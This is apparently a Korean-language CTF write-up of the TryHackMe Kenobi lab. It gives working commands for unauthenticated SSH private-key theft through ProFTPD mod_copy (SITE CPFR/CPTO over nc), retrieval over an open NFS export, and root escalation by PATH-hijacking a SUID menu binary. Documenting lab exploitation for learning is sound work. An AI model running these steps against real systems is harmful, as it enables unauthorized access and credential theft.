---
title: TryHackMe - Kenobi
date: 2026-08-20 00:00:00 +0900
categories:
- Pentest
tags: []
author: mmamm4
---

# TryHackMe - Kenobi

Kenobi는 FTP·SMB·NFS가 한 호스트에 같이 열려 있고, 그 셋을 순서대로 엮어야 첫 셸이 열리는 박스입니다. 정찰에서 나온 단서를 따라가면 kenobi 계정의 SSH 개인키를 인증 없이 빼낼 수 있고, 셸을 잡은 뒤에는 root 소유로 남겨진 SUID 프로그램 하나가 권한 상승의 통로가 됩니다. 정찰부터 root까지 실제로 밟은 경로를 정리합니다.

## 대상과 환경

타겟은 TryHackMe Kenobi room이 띄워 주는 원격 호스트(`10.49.185.92`)로, OpenVPN 터널 너머에 있습니다. 공격 측은 VMware의 Kali이고 `tun0`로 THM 망에 붙였습니다. 목표는 kenobi user 셸을 거쳐 root 셸(`uid=0`)과 `/root` 플래그까지 확인하는 것입니다.

## 정찰

포트가 어디에 몰려 있는지 모르는 상태라 상위 1000포트 기본 스캔은 접고 전체 포트를 훑었습니다.

```bash
sudo nmap -sV -sC -p- 10.49.185.92
```

```
21/tcp    open  ftp         ProFTPD 1.3.5
22/tcp    open  ssh         OpenSSH 8.2p1 Ubuntu
80/tcp    open  http        Apache httpd 2.4.41   (robots.txt disallow: /admin.html)
111/tcp   open  rpcbind     2-4  → rpcinfo에 nfs(2049), mountd 노출
139/tcp   open  netbios-ssn Samba smbd 4
445/tcp   open  netbios-ssn Samba smbd 4
2049/tcp  open  nfs         3-4
```

눈길이 간 건 세 곳입니다. FTP는 ProFTPD 1.3.5로 버전까지 그대로 드러났고, Samba가 139·445에 떠 있어 익명 공유를 볼 여지가 있었습니다. rpcbind가 NFS(2049)와 mountd를 노출한 것도 나중에 쓸 자리로 기억해 뒀습니다. 80번 웹은 robots.txt에 `/admin.html`이 걸려 있었지만 이번 경로에서는 쓰지 않았습니다.

## 공유·마운트 열거

Samba부터 익명으로 붙어 봤습니다.

```bash
smbclient -L //10.49.185.92/ -N
```

```
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
anonymous       Disk
IPC$            IPC       IPC Service (kenobi server (Samba, Ubuntu))
```

`anonymous` 공유가 비밀번호 없이 목록에 잡혔습니다. 그대로 그 공유에 익명으로 붙어 내용을 확인하고 `log.txt`를 내려받았습니다.

```
$ smbclient //10.49.185.92/anonymous -N
smb: \> ls
  .                                   D        0  Thu Aug 20 00:06:44 2026
  ..                                  D        0  Sat Aug  9 09:03:22 2025
  log.txt                             N    12237  Wed Sep  4 06:49:09 2019
smb: \> get log.txt
```

단서는 `log.txt`(12237B)에 있었습니다. kenobi가 SSH 키를 만들 때 남긴 로그로, 키를 `/home/kenobi/.ssh/id_rsa`에 passphrase 없이 생성했다는 내용과 ProFTPd·Samba 설정이 함께 드러나 있었고, `[anonymous]` 공유의 실제 경로가 `/home/kenobi/share`라는 것도 여기서 나왔습니다. 훔칠 키의 위치와, 그 키에 암호가 걸려 있지 않다는 사실이 이 한 파일에서 같이 정리된 셈입니다.

NFS로 밖에 열린 디렉터리도 확인했습니다.

```bash
showmount -e 10.49.185.92
```

`/var`가 `*`, 즉 누구에게나 export돼 있어 그대로 마운트할 수 있었습니다. 뒤에서 파일을 복사해 내릴 목적지로 쓰게 됩니다.

## ProFTPD mod_copy로 키 반출

ProFTPD 1.3.5는 mod_copy 취약점(CVE-2015-3306)을 안고 있습니다. mod_copy가 더해 주는 `SITE CPFR`(copy from)·`SITE CPTO`(copy to) 두 명령이 로그인 여부를 확인하지 않고 처리되는 것이 문제의 핵심입니다. 원본을 `CPFR`로, 목적지를 `CPTO`로 지정하면 서버가 자기 권한(ProFTPD 데몬 권한)으로 두 경로 사이를 그대로 복사합니다. `USER`/`PASS`를 한 번도 보내지 않은 익명 세션에서, 데몬 권한으로 읽을 수 있고 목적지에 쓸 수 있는 범위의 파일을 옮길 수 있다는 뜻입니다.

searchsploit에 있는 EDB 36803은 웹 루트에 PHP 웹셸을 떨어뜨려 RCE로 잇는 걸 전제로 짜여 있어 이 박스에는 그대로 맞지 않았습니다. 여기서 필요한 건 코드 실행이 아니라 손이 닿지 않는 개인키를 닿는 곳으로 옮기는 복사 동작뿐이라, 스크립트를 통째로 쓰는 대신 그 primitive만 떼어다 `nc`로 21번 포트에 붙어 명령을 직접 타이핑했습니다.

원본은 log.txt에서 위치를 확인한 개인키(`/home/kenobi/.ssh/id_rsa`)이고, 목적지는 앞서 `showmount`로 확인한, 누구에게나 export된 `/var` 아래(`/var/tmp/id_rsa`)로 잡았습니다. FTP로는 못 읽는 파일이라도 일단 NFS로 마운트되는 트리 안에 복사해 두면 그쪽에서 그대로 회수할 수 있기 때문입니다.

```
$ nc 10.49.185.92 21
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
```

`SITE CPFR` 뒤에 온 `350`은 FTP에서 "명령은 받았고 다음 정보(여기서는 목적지)를 기다린다"는 중간 응답입니다. 원본 경로를 받아들여 다음 단계로 넘어갔다는 신호일 뿐, 그 자체가 읽기 권한까지 보장하지는 않습니다. 복사가 실제로 성립했다는 근거는 이어진 `SITE CPTO`의 `250 Copy successful`입니다. `250`은 요청한 동작이 정상 완료됐다는 응답이라, 인증 없이 개인키 복사가 끝났다는 사실은 이 완료 응답으로 확정됩니다.

## NFS 마운트와 SSH foothold

`/var`를 로컬에 걸고 방금 복사한 키를 꺼냈습니다. SSH는 개인키 권한이 느슨하면 키를 거부하므로 600으로 조인 다음 접속했습니다.

```bash
sudo mount 10.49.185.92:/var /mnt/kenobi
cp /mnt/kenobi/tmp/id_rsa ~/mma/id_rsa && chmod 600 ~/mma/id_rsa
ssh -i ~/mma/id_rsa kenobi@10.49.185.92
```

키에 passphrase가 없어 암호를 묻지 않고 바로 셸이 열렸습니다.

```
kenobi@kenobi:~$ id
uid=1000(kenobi) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
kenobi@kenobi:~$ cat user.txt
<user flag redacted>
```

접속 형식은 `ssh -i <키파일> kenobi@<IP>`입니다. 훔친 키를 기본 경로(`~/.ssh`)가 아닌 곳에 뒀으니 `-i`로 그 위치를 짚어 줘야 했고, 처음 몇 번은 이 옵션을 빼거나 사용자·호스트를 뒤섞어 거부당했습니다.

## SUID 바이너리 PATH 하이재킹으로 권한 상승

kenobi 권한으로는 여기까지라, root로 올라갈 자리를 SUID 바이너리에서 찾았습니다.

```bash
find / -perm -u=s -type f 2>/dev/null
```

```
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/menu          <- 표준 위치가 아닌 바이너리
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
...
/bin/mount
/bin/su
```

`mount`·`su`·`sudo`·`passwd`·`pkexec`처럼 배포판에 원래 있는 것들 사이에 `/usr/bin/menu`가 끼어 있었습니다. 경로도 이름도 낯설어 이걸 먼저 들여다봤습니다.

```
$ strings /usr/bin/menu
...
setuid
system
1. status check
2. kernel version
3. ifconfig
curl -I localhost
uname -r
ifconfig
```

심볼에 `setuid`와 `system`이 함께 있고, 메뉴가 부르는 `curl`·`uname`·`ifconfig`가 모두 절대경로 없이 이름만 적혀 있었습니다. `strings`만으로 실행 흐름을 단정할 수는 없지만, root 소유 SUID 바이너리가 `system()`으로 상대경로 명령을 부른다면 `PATH` 조작이 그대로 통합니다. `system()`은 명령을 찾을 때 `PATH`를 앞에서부터 뒤지므로, 쓰기 가능한 디렉터리를 맨 앞에 끼우고 거기에 같은 이름의 파일을 두면 진짜 대신 그 파일이 실행됩니다. 실제로 root 셸이 떨어진 것이 이 추정을 확인해 줬습니다.

3번 항목이 부르는 `ifconfig`를 가짜로 바꿔치기했습니다.

```bash
cd /tmp
echo '/bin/bash' > /tmp/ifconfig
chmod +x /tmp/ifconfig
export PATH=/tmp:$PATH
/usr/bin/menu        # 3 선택
```

메뉴에서 3을 고르자 `menu`가 `ifconfig`를 찾다가 `/tmp/ifconfig`, 곧 `/bin/bash`를 root로 실행했습니다.

```
root@kenobi:/tmp# id
uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),...
root@kenobi:/root# cat root.txt
<root flag redacted>
```

## 정리

foothold까지 이르는 길에 단일 취약점은 없었습니다. SMB 익명 공유가 키의 위치와 "암호 없음"을 알려 줬고, ProFTPD mod_copy가 그 키를 밖에서 닿는 곳으로 옮겨 줬으며, 누구에게나 열린 NFS export가 그걸 회수하는 손이 됐습니다. 셋 중 하나라도 닫혀 있었으면 끊겼을 사슬입니다. 권한 상승은 그보다 단순해서, root SUID로 남은 커스텀 바이너리가 외부 명령을 상대경로로 부른다는 허점 하나가 전부였습니다. PATH를 쥐면 그 명령이 곧 내 명령이 됩니다.
